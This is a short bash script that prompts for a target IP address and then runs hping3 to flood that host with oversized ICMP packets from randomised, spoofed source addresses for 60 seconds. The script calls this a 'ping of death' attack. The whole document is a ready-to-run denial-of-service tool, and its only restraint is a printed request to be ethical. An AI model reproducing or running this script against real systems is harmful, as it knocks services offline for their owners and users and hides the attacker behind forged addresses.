#!/bin/bash

ask_input() {
  read -p "Enter the target IP: " target_ip
}

ping_of_death() {
  timeout=60
  trap 'echo "Attack stopped by user."; exit 0' INT
  echo "Starting ping of death attack against $target_ip for $timeout seconds."
  time sudo hping3 --flood --icmp --data 65536 --rand-source $target_ip &
  pid=$!
  sleep $timeout || wait $pid
  kill -9 $pid 2>/dev/null
  echo "Attack finished."
}

check_input() {
  if [[ -z $target_ip ]]; then
    echo "Invalid input. Please try again."
    ask_input
    check_input
  fi
}

echo "This script will perform a ping of death attack using hping3."
echo "Please be careful and ethical when using this script and do not attack any servers without permission."
ask_input
check_input
ping_of_death
